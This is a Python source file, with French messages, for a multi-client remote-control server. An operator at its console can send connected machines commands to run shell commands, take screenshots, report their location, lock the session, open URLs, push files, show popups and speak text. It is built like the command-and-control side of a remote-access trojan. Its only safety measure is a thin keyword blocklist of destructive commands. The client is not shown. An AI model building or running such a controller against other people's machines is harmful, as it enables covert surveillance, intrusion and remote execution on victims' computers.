import socket
import threading
import os
import datetime
from concurrent.futures import ThreadPoolExecutor

HOST = '0.0.0.0'
PORT = 65432
clients = {}
client_id = 0
MAX_THREADS = 10

def log(message):
    with open("serveur.log", "a") as f:
        f.write(f"[{datetime.datetime.now()}] {message}\n")

def broadcast(message, sender_id=None):
    for cid, (conn, addr) in list(clients.items()):
        if cid != sender_id:
            try:
                conn.sendall(f"broadcast:{message}".encode('utf-8'))
            except Exception as e:
                log(f"Erreur broadcast vers {cid}: {e}")
                del clients[cid]

def list_clients():
    print("\n--- Clients connectés ---")
    for cid, (conn, addr) in clients.items():
        print(f"ID: {cid}, IP: {addr[0]}")
    print("----------------------\n")

def send_file(conn, filepath):
    try:
        if not os.path.exists(filepath):
            conn.sendall(b"Erreur: Fichier introuvable.")
            return False
        with open(filepath, "rb") as f:
            data = f.read()
        filename = os.path.basename(filepath)
        conn.sendall(f"file:{filename}:{len(data)}".encode('utf-8'))
        conn.recv(1024)
        conn.sendall(data)
        return True
    except Exception as e:
        log(f"Erreur envoi fichier: {e}")
        conn.sendall(f"Erreur: {str(e)}".encode('utf-8'))
        return False

def is_command_safe(cmd):
    forbidden = ["del", "rm", "format", "shutdown", "reboot", "mkdir", "rmdir"]
    return not any(f in cmd.lower() for f in forbidden)

def handle_client(conn, addr, cid):
    global clients
    ip_client = addr[0]
    print(f"Nouveau client (ID: {cid}, IP: {ip_client})")
    try:
        conn.sendall(b"Connecte ! Tapez 'help' pour voir les commandes.")
        clients[cid] = (conn, addr)

        while True:
            try:
                command = input(f"Commande pour {cid} ({ip_client}) : ")
                log(f"Commande envoyee a {cid}: {command}")
                if command.lower() == 'exit':
                    break
                elif command.lower() == 'list':
                    list_clients()
                    continue
                elif command.lower() == 'help':
                    help_msg = """
Commandes disponibles :
- popup:<id>:<message>    : Affiche une pop-up sur le client <id>
- browser:<id>:<url>      : Ouvre <url> sur le client <id>
- file:<id>:<chemin>      : Envoie le fichier <chemin> au client <id>
- location:<id>          : Demande la localisation du client <id>
- cmd:<id>:<commande>     : Exécute <commande> sur le client <id> (restreint)
- broadcast:<message>    : Envoie <message> à tous les clients
- kick:<id>              : Déconnecte le client <id>
- screenshot:<id>        : Capture l'écran du client <id>
- lock:<id>              : Vérrouille la session du client <id>
- speak:<id>:<message>   : Fait parler le client <id> avec <message>
- list                   : Liste les clients connectés
- help                   : Affiche cette aide
- exit                   : Ferme la connexion
"""
                    print(help_msg)
                    continue
                elif command.startswith("popup:"):
                    parts = command.split(":", 2)
                    if len(parts) == 3:
                        cid_target, message = int(parts[1]), parts[2]
                        if cid_target in clients:
                            clients[cid_target][0].sendall(f"popup:{message}".encode('utf-8'))
                        else:
                            print(f"Client {cid_target} introuvable.")
                elif command.startswith("browser:"):
                    parts = command.split(":", 2)
                    if len(parts) == 3:
                        cid_target, url = int(parts[1]), parts[2]
                        if cid_target in clients:
                            clients[cid_target][0].sendall(f"browser:{url}".encode('utf-8'))
                        else:
                            print(f"Client {cid_target} introuvable.")
                elif command.startswith("file:"):
                    parts = command.split(":", 2)
                    if len(parts) == 3:
                        cid_target, filepath = int(parts[1]), parts[2]
                        if cid_target in clients:
                            if send_file(clients[cid_target][0], filepath):
                                print(f"Fichier {filepath} envoyé à {cid_target}.")
                            else:
                                print(f"Erreur envoi fichier {filepath}.")
                        else:
                            print(f"Client {cid_target} introuvable.")
                elif command.startswith("location:"):
                    cid_target = int(command[9:])
                    if cid_target in clients:
                        clients[cid_target][0].sendall(b"location")
                    else:
                        print(f"Client {cid_target} introuvable.")
                elif command.startswith("cmd:"):
                    parts = command.split(":", 2)
                    if len(parts) == 3:
                        cid_target, cmd = int(parts[1]), parts[2]
                        if not is_command_safe(cmd):
                            print("Commande interdite.")
                            continue
                        if cid_target in clients:
                            clients[cid_target][0].sendall(f"cmd:{cmd}".encode('utf-8'))
                        else:
                            print(f"Client {cid_target} introuvable.")
                elif command.startswith("broadcast:"):
                    broadcast(command[10:], cid)
                    continue
                elif command.startswith("kick:"):
                    kick_id = int(command[5:])
                    if kick_id in clients:
                        conn, addr = clients[kick_id]
                        conn.sendall(b"Deconnecte par l'administrateur.")
                        conn.close()
                        del clients[kick_id]
                        print(f"Client {kick_id} ({addr[0]}) deconnecte.")
                    else:
                        print(f"Client {kick_id} introuvable.")
                    continue
                elif command.startswith("screenshot:"):
                    cid_target = int(command[11:])
                    if cid_target in clients:
                        clients[cid_target][0].sendall(b"screenshot")
                    else:
                        print(f"Client {cid_target} introuvable.")
                elif command.startswith("lock:"):
                    cid_target = int(command[5:])
                    if cid_target in clients:
                        clients[cid_target][0].sendall(b"lock")
                    else:
                        print(f"Client {cid_target} introuvable.")
                elif command.startswith("speak:"):
                    parts = command.split(":", 2)
                    if len(parts) == 3:
                        cid_target, message = int(parts[1]), parts[2]
                        if cid_target in clients:
                            clients[cid_target][0].sendall(f"speak:{message}".encode('utf-8'))
                        else:
                            print(f"Client {cid_target} introuvable.")
                else:
                    conn.sendall(command.encode('utf-8'))
                response = conn.recv(1024)
                print(f"Reponse de {cid} : {response.decode('utf-8', errors='replace')}")
            except (ConnectionResetError, BrokenPipeError):
                print(f"Client {cid} ({ip_client}) deconnecte.")
                break
    except Exception as e:
        log(f"Erreur avec client {cid}: {e}")
    finally:
        if cid in clients:
            del clients[cid]
        conn.close()

def main():
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((HOST, PORT))
            s.listen()
            print(f"Serveur en écoute sur {HOST}:{PORT}")
            while True:
                try:
                    conn, addr = s.accept()
                    global client_id
                    client_id += 1
                    executor.submit(handle_client, conn, addr, client_id)
                except Exception as e:
                    log(f"Erreur serveur: {e}")

if __name__ == "__main__":
    main()
